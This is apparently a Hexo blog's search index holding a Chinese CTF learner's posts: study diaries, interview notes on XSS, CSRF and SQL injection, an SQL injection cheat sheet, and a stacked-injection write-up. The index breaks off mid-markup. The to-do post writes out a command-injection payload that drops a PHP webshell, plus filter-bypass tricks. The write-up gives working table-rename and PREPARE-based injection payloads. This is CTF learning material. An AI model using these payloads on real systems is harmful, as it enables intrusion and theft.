<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Todo近一个月的反思和总结</title>
    <link href="/2021/02/01/todo_reflct/"/>
    <url>/2021/02/01/todo_reflct/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-近一个月去完成的事"><a class="header-anchor" href="#0x00-近一个月去完成的事"></a>0x00 近一个月去完成的事</h2><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 真正的感受到参加CTF那种热血和趣味</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 接触到更多志同道合的小伙伴</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 有规律的作息</li></ul><h3 id="0x01-杂谈"><a class="header-anchor" href="#0x01-杂谈"></a>0x01 杂谈</h3><h4 id="在自我管理方面："><a class="header-anchor" href="#在自我管理方面："></a>在自我管理方面：</h4><p> Todo确实可以提高我自己的专注度，但是在设置Todo的目标上还要做一些减法，看起来Todo的一个简单小目标，完成的过程中总会遇到各种坑，过多的目标和踩坑拖延时间，会导致自己变的焦虑；</p><p> 有趣的恶性循环：</p><p><strong>过度的目标</strong> ➔ <strong>焦虑</strong> ➔ <strong>失眠</strong> ➔ <strong>晚睡早起</strong> ➔ <strong>寻找解决方法（刷B站，牛客，知乎等）</strong> ➔ <strong>重新设立目标（上一个未完成）</strong></p><h4 id="在学习-专注方面："><a class="header-anchor" href="#在学习-专注方面："></a>在学习&amp;专注方面：</h4><p>  学习了一段时间想检验一下自己，看到默安在招实习生，然后就想尝试一下，不得不说内推的效率真的高，第一天投简历，第二天就直接来了两面，这次有进步的地方，比前几次面试心理上放得开很多说话也流畅了许多，想起来第一次面试的时候，说话都磕磕绊绊，异常紧张和兴奋。</p><p> 有趣的面试问题：</p><p> 一面问我，“如何最快的检测一个网站是否存在SQL注入？” 心里想：那肯定是Sqlmap一把梭啊，手动注入的话，查看网站CMS有无现成源码，然后代码审计关键登陆，我当时说了个就加特殊符号看有无报错😅。</p><p> 二面老哥，很着急的样子，讲了一下XSS反射性，存储型的原理和危害，然后问我区别是什么 ➔ 一句话总结：<strong>存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里</strong>。我当时虚头巴脑的讲了一堆危害不同？😐现在反思一下，学习完应该多总结一些学过的东西，不然跟别人讲出来也是乱七八糟的。</p><p> 后面就是SQL注入，CSRF原理啊，巴拉巴拉，然后问我 CSRF和XSS反射性的区别是什么？我当时愣了1s 说xss是通过浏览器，CSRF是通过URL？回想一下说的不对。一句话总结：<strong>XSS 利用的是网站对用户（输入）的信任，CSRF 利用的是网站对用户网页浏览器的信任</strong> 后面说什么让我走流程，然后就没了音讯，盲猜GG了🤪。</p><ul><li><p>XSS反射性：<strong>恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行</strong></p></li><li><p>CSRF 是 Cross-Site Request Forgery (跨站请求伪造)，CSRF 攻击 <strong>通过伪装成受信任用户的请求来利用受信任的网站</strong> ，不管使用什么方法只要是伪造用户发起的请求都可以称为 CSRF 攻击。</p></li></ul><p> 综上，面试的过程，通常还是看对 基础知识和原理 的理解和总结。常用的注入工具也没怎么问，要问肯定也是工具某个命令的原理之类的。倒是我简历写的Docker方面的东西，面试官似乎都很感兴趣，想让我说出一些docker逃逸之类的东西😵‍💫。</p><h3 id="0X02-未来一周的Todo"><a class="header-anchor" href="#0X02-未来一周的Todo"></a>0X02 未来一周的Todo</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 尝试去补天，漏洞盒子公益项目挖洞</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学过的基础知识总结和熟练</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学习PHP，JAVA后端开发</li></ul><h3 id="0X03-激励自己和一些牢骚"><a class="header-anchor" href="#0X03-激励自己和一些牢骚"></a>0X03 激励自己和一些牢骚</h3><blockquote><p>好像越来越喜欢安静了，青轴的清脆让我觉得是噪音，不喜欢边听歌边干别的事情，让人感觉烦躁</p><p>TK和yaunge的一些话</p></blockquote><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/TODO/yuange.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/TODO/tk.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Todo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ctfhub_SQL注入</title>
    <link href="/2021/01/20/ctfhub-sqli/"/>
    <url>/2021/01/20/ctfhub-sqli/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-SQL注入的基础"><a class="header-anchor" href="#0x01-SQL注入的基础"></a>0x01 SQL注入的基础</h3><h4 id="1-注入类型"><a class="header-anchor" href="#1-注入类型"></a>1.注入类型</h4><ol><li>UNION query SQL injection  联合注入</li><li>Error-based SQL injiecttion 报错注入</li><li>Boolean-based blind SQL injection 布尔盲注</li><li>Time-based blind SQL injection   时间盲注</li><li>Stack queries SQL injection 堆叠注入</li></ol><h4 id="2-注入点类型"><a class="header-anchor" href="#2-注入点类型"></a>2.注入点类型</h4><ol><li>GET 数据</li><li>POST 数据</li><li>HTTP 请求报文</li><li>Cookie 数据</li></ol><h4 id="3-常用函数和参数"><a class="header-anchor" href="#3-常用函数和参数"></a>3.常用函数和参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version()<br>database()<br>user()<br>current_user()<br>system_user()<br>@@datadir            #数据库路径  <br>@@version_compile_os #操作系统版本<br>length()<br>substring()<br>substr()<br>mid(String,start_local_1,)<br>left()<br>concat()          #没有分隔符<br>concat_ws()       #有分隔符<br>group_concat()    #连接一个组的字符串<br>ord()#返回ASCII码<br>ascii()#和ord相同<br>hex()#取16进制<br>unhex()#反<br>md5()#取md5<br>floor()#向下取整<br>round()#取4,5的整数<br>rand()#返回0-1之间的数字<br>load_file()#读取文件，返回字符串<br>sleep()#延迟<br>if(true,t,f)#if判断 如果成立执行t,不成立执行f<br>find_in_set()#返回字符串在字符串列表中的位置<br>benchmark()#指定语句执行的次数<br>name_const()#返回表结果<br></code></pre></td></tr></table></figure><h3 id="4-思路"><a class="header-anchor" href="#4-思路"></a>4.思路</h3><h4 id="前提是存在SQL注入"><a class="header-anchor" href="#前提是存在SQL注入"></a>前提是存在SQL注入</h4><hr><ol><li><strong>回显</strong> --&gt; <strong>联合查询</strong></li><li><strong>报错</strong> --&gt; <strong>报错注入</strong></li><li><strong>布尔类型状态</strong>–&gt; <strong>布尔注入and 延时注入</strong></li><li><strong>其他</strong> --&gt; <strong>Cookie注入</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#报错注入<br>select count (*) from information _schema.tables group by concat ((此处加入执行语句),0x7e,floor (rand (0)*2));<br>select extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));<br>select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP基础</title>
    <link href="/2021/01/19/http-base/"/>
    <url>/2021/01/19/http-base/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>HTTP基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Todo(2021/01/19-25)</title>
    <link href="/2021/01/19/Todo_1_19/"/>
    <url>/2021/01/19/Todo_1_19/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-习惯的养成"><a class="header-anchor" href="#0x00-习惯的养成"></a>0x00 习惯的养成</h3><blockquote><p>早睡早起，锻炼身体，做TODO，让生活慢下来</p><p>专注的去做几件事</p><p>距离Ctf升降赛还有0天。</p></blockquote><h3 id="0x01-今天的小目标"><a class="header-anchor" href="#0x01-今天的小目标"></a>0x01 今天的小目标</h3><ol><li>重要目标</li></ol><ul class="contains-task-list"><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Ctfhub 的信息泄露，密码口令 和 SQL注入</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Upload-labs 的训练和总结</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 信息泄露_Git+NU1L的SQL注入</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Sqli-labs 的训练和总结</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 选拔赛</p></li></ul><h3 id="0x03-各种踩坑"><a class="header-anchor" href="#0x03-各种踩坑"></a>0x03 各种踩坑</h3><ol><li>kali有pyhton2和python3</li><li>dirsearch因为作者的原因出bug 回退上个版本</li><li>Githack 老版本不能获取.git文件夹，只针对.git存在的对象</li><li>Git 暂存区的概念 git stash 保存暂存区和工作区的进度/ git stash pop 恢复最新的进度到工作区。</li><li>git index是版本库</li></ol><h3 id="0X04-RCE远程执行"><a class="header-anchor" href="#0X04-RCE远程执行"></a>0X04 RCE远程执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">方法1：ls ../<br>方法2:127.0.0.1&amp;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"&lt;?php @eval(\$_POST['ice']);?&gt;"</span> &gt; 111.php <br><span class="hljs-comment">#cat过滤</span><br>反斜杠 ： 例如  ca\t fl\ag.php<br>连接符： 例如   ca<span class="hljs-string">''</span>t fla<span class="hljs-string">''</span>g.txt<br><span class="hljs-comment">#空格过滤</span><br>&lt;,&lt;&gt;,%20(space),%09(tab),<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>, <span class="hljs-variable">$&#123;IFS&#125;</span>,<span class="hljs-variable">$IFS</span><br><span class="hljs-comment">#分隔符可以使用%0a代替</span><br>若直接使用文本框上传命令会导致字符被转义，直接访问URL<br></code></pre></td></tr></table></figure><h3 id="0X05-短暂的结果"><a class="header-anchor" href="#0X05-短暂的结果"></a>0X05 短暂的结果</h3><p>QAQ真刺激啊这比赛,第7就是我了。</p><p>PS:😅好多原题没做出来，有种考研数学一的味道了，每天做点题，做题实在是太少了。</p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/hbca_ctf_1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Todo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>从2019强网杯[随便注]学习堆叠注入</title>
    <link href="/2021/01/14/qwb-easy-sql/"/>
    <url>/2021/01/14/qwb-easy-sql/</url>
    
    <content type="html"><![CDATA[<h3 id="0X1-确认是SQL注入，查找字段数"><a class="header-anchor" href="#0X1-确认是SQL注入，查找字段数"></a>0X1 确认是SQL注入，查找字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">1' order by 1; <span class="hljs-comment">#</span><br>1' order by 2; <span class="hljs-comment">#</span><br>1' order by 3; <span class="hljs-comment">#</span><br><span class="hljs-comment">#确认是2个字段</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x2-联合注入-尝试绕过"><a class="header-anchor" href="#0x2-联合注入-尝试绕过"></a>0x2  联合注入&amp;尝试绕过</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>; <span class="hljs-meta">#</span><br><span class="hljs-meta">#回显被PHP的preg_match()函数 正则表达式过滤</span><br></code></pre></td></tr></table></figure><h4 id="PHP知识扩展之-preg-match-函数"><a class="header-anchor" href="#PHP知识扩展之-preg-match-函数"></a>-PHP知识扩展之 preg_match() 函数</h4><ul><li>语法用法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//模式分隔符后的"i"标记这是一个大小写不敏感的搜索，所以SQL注入用大小写绕过是没有用的</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/php/i"</span>, <span class="hljs-string">"PHP is the web scripting language of choice."</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"查找到匹配的字符串 php。"</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"未发现匹配的字符串 php。"</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_2.png" srcset="/img/loading.gif" alt=""></p><p><strong>通过回显 发现select，update，delete，drop，insert，where ，点符号，都被过滤，尝试用堆叠注入</strong></p><h3 id="0X3-堆叠注入"><a class="header-anchor" href="#0X3-堆叠注入"></a>0X3 堆叠注入</h3><ol><li>尝试堆叠注入发现所有数据库</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1'; <span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_3.png" srcset="/img/loading.gif" alt=""></p><ol start="2"><li>查看当前数据库的所有表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">1'; <span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_4.png" srcset="/img/loading.gif" alt=""></p><ol start="3"><li>查看 1919810931114514 ，words 表的列名</li></ol><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_5.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_6.png" srcset="/img/loading.gif" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">1'; <span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`1919810931114514`</span>; <span class="hljs-comment">#</span><br>1'; <span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words; <span class="hljs-comment">#</span><br>得知Flag在 1919810931114514 表中,但<span class="hljs-keyword">select</span>函数被过滤<br></code></pre></td></tr></table></figure><h3 id="0X4-表改名-预编译绕过"><a class="header-anchor" href="#0X4-表改名-预编译绕过"></a>0X4 表改名&amp;预编译绕过</h3><h4 id="方法一-修改表名"><a class="header-anchor" href="#方法一-修改表名"></a>方法一 修改表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: 1'; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> word1; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">to</span> words; <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">#</span><br><br>拆解：<br>1'; <br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> word1; <br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">to</span> words; <br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="方法二-预编译绕过过滤"><a class="header-anchor" href="#方法二-预编译绕过过滤"></a>方法二 预编译绕过过滤</h4><ol><li>SQL无变量预处理+Concat绕过</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> [<span class="hljs-keyword">name</span>] <span class="hljs-keyword">from</span> <span class="hljs-string">'[sql语句]'</span>;    <span class="hljs-comment">#生成预编译语句</span><br><span class="hljs-keyword">EXECUTE</span> [<span class="hljs-keyword">name</span>];                    <span class="hljs-comment">#执行预定义SQL语句 </span><br>(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span>; <span class="hljs-comment">#删除预编译语句</span><br><br>payload: <br>1';<span class="hljs-keyword">PREPARE</span> ice <span class="hljs-keyword">from</span> <span class="hljs-keyword">concat</span>(<span class="hljs-string">'s'</span>,<span class="hljs-string">'elect'</span>,<span class="hljs-string">' * from `1919810931114514` '</span>); <span class="hljs-keyword">EXECUTE</span> ice; <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_7.png" srcset="/img/loading.gif" alt=""></p><ol start="2"><li>SQL存在变量预处理+char+concat</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> @tb = <span class="hljs-string">'words'</span>;  //存储表名<br><span class="hljs-keyword">SET</span> @sql1 = <span class="hljs-keyword">concat</span>(<span class="hljs-string">'se'</span>,<span class="hljs-string">'lect * from '</span>, @tb);  //存储SQL语句<br><span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> @sql1;   //预定义SQL语句<br><span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //执行预定义SQL语句<br>(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> sql1;  //删除预定义SQL语句<br><br><span class="hljs-keyword">select</span> = <span class="hljs-built_in">char</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>)<br>payload: <span class="hljs-number">1</span><span class="hljs-string">'; SET @sql1=concat(char(115,101,108,101,99,116),'</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-string">');PREPARE ice from @sql1;EXECUTE ice;#</span><br></code></pre></td></tr></table></figure><h3 id="0X5-FLAG"><a class="header-anchor" href="#0X5-FLAG"></a>0X5 FLAG</h3><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/CTF_QWB_EASY_SQL_flag.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit学习</title>
    <link href="/2021/01/13/msf-study/"/>
    <url>/2021/01/13/msf-study/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-Metasploit渗透测试框架"><a class="header-anchor" href="#0x01-Metasploit渗透测试框架"></a>0x01 Metasploit渗透测试框架</h3><p>​Metasploit是-个渗透测试平台,使你能够查找,利用和验证漏洞。该平台包括Metasploit框架及<br>其商业对手，如Metasploit Pro。Metasploit是一个免费，可下载的框架，通过他可以很容易的对计算机软件漏洞实施攻击。<a id="more"></a></p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/metasploit_1.png" srcset="/img/loading.gif" alt=""></p><ol><li><p>基础库：metasploit 基础库文件位于源码根目录路径下的 libraries 目录中<br>Rex,framework-core 和 framework-base 三部分。</p><ul><li>Rex 是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL 以及 MySQL 数据库支持等；</li><li>framework-core 库负责实现所有与各种类型的上层模块及插件的交互接口；</li><li>framework-base 库扩展了 framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；</li></ul></li><li><p>模块：模块组织按照不同的用途分为 6 种类型的模块（Modules）：</p><ul><li>分为辅助模块（Aux)</li><li>渗透攻击模块（Exploits)</li><li>后渗透攻击模块（Post)</li><li>攻击载荷模块（payloads)</li><li>编码器模块（Encoders)</li><li>空指令模块（Nops)<ul><li>注：payload 又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回 shell，也可以进行程序注入等</li></ul></li></ul></li><li><p>插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。</p><p>插件可以集成现有的一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web_tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每日Todo列表(2021/01/13-18)</title>
    <link href="/2021/01/13/Todo_1_13_18/"/>
    <url>/2021/01/13/Todo_1_13_18/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-开心的事情🙃"><a class="header-anchor" href="#0x00-开心的事情🙃"></a>0x00 开心的事情🙃</h3><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/TODO/todo_1_13_1.png" srcset="/img/loading.gif" alt=""></p><p><strong>知识的学习肯定是一部分，更好的一面应该是有交流学习的空间和话题</strong></p><a id="more"></a><h3 id="0x01-今天的任务😎"><a class="header-anchor" href="#0x01-今天的任务😎"></a>0x01 今天的任务😎</h3><ul class="contains-task-list"><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 学习并且弥补SQL注入漏洞方面的方法和概念</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 学习并且复习JavaScript的语法</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成SQLi注入靶场和书中的CTF试题（NI1L）</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 继续学习Python的进阶相关的用法（小甲鱼）</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 学习PHP并且做一些后端的小东西</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成河北网络安全高校联盟课程当天的任务</p></li></ul><h3 id="0x02-来点🐔汤吧"><a class="header-anchor" href="#0x02-来点🐔汤吧"></a>0x02 来点🐔汤吧</h3><p>加紧学习，抓住中心，宁精勿杂，宁专勿多。</p><h3 id="0x03-1-13内疚的一天-¿"><a class="header-anchor" href="#0x03-1-13内疚的一天-¿"></a>0x03 1/13内疚的一天 ¿</h3><blockquote><p>上午听HSCA课程，重点听了下职业规划，还有王师傅分享自己虽然起点低，但是经过一年的学习找到了自己适合的方向。</p><p>下午摸鱼了，跑了一些生活中的琐事。累死了，迷了一会。</p><p>晚上回顾了一下下午的环境配置，自己基本都是之前搞定的，然后KALI就暴毙了？？，Shell莫名其妙就没有了。自己之前还忘记备份，赶紧把毁灭吧。</p><p>然后开始搞MSF和vulhub ，10点半生物钟来了，没完成今天的计划，14日早晨早早起来做MSF的ms17_010复现</p></blockquote><h3 id="0X04-1-14的小问题查询"><a class="header-anchor" href="#0X04-1-14的小问题查询"></a>0X04 1/14的小问题查询</h3><ol><li>Centos7启动的时候的有多个启动项是为什么？</li></ol><blockquote><p>CentOS更新的时候为了防止新内核无法启动，没有立刻删除老的内核，而是修改了GRUB的配置文件，将新内核作为默认启动项，同时保留老内核。这样如果新内核无法启动计算机还可以手工选择老内核启动。</p><p>初始化系统的时候应该是有2个启动项：</p><p>第一个是当前Linux的内核 ；第二个是紧急启动</p></blockquote><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/DayDay/Q_1_14_1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0X05-混乱的几天时间"><a class="header-anchor" href="#0X05-混乱的几天时间"></a>0X05 混乱的几天时间</h3><p>从15到18，因为很多朋友和发小回来了，每天只是完成课程当天的复盘就去聚会了，没来的急去总结。拿出这一周的时间，认真准备周日的升降赛。</p>]]></content>
    
    
    <categories>
      
      <category>Todo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NU1l_CTF_信息收集_git泄露</title>
    <link href="/2021/01/12/git-study/"/>
    <url>/2021/01/12/git-study/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-Git的诞生"><a class="header-anchor" href="#0x00-Git的诞生"></a>0x00 Git的诞生</h3><blockquote><p>事情是这样的，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！</p><p>你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。</p><p>不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。</p><p>安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。</p><p>Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：</p><p>Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。</p></blockquote><h3 id="0x01-Git安装-基本使用"><a class="header-anchor" href="#0x01-Git安装-基本使用"></a>0x01 Git安装&amp;基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 